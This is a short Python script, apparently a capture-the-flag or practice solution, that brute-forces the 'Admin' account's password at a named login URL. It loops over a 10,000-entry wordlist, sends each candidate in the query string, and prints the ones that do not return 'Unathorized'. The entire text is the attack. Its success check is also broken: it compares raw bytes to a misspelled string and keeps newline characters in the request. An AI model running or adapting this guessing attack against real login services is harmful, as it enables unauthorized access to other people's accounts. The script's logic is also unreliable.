import urllib.request

f = open("10k","r")
url = "http://login.cityinthe.cloud/login?username=Admin&password="

for line in f:
	with urllib.request.urlopen(url+line) as response:
		html = response.read()
		if html != "Unathorized":
			print(line)
